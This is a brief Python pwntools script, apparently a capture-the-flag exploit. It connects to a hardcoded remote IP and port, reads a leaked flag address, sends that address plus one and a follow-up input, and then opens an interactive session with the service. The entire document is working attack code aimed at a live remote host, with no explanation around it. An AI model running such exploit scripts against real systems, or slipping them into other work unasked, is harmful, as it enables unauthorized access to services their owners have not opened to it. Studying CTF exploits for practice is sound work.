from pwn import *
context.log_level = 'debug'
sh = remote("101.42.48.14",8091)

flag_addr = int(sh.recvuntil('\n')[:-1],16)
log.success('flag_addr: ' + hex(flag_addr))
sh.recvuntil("\n")
sh.sendline(str(flag_addr+1))
sh.recvuntil("\n")
sh.sendline("1")
sh.interactive()
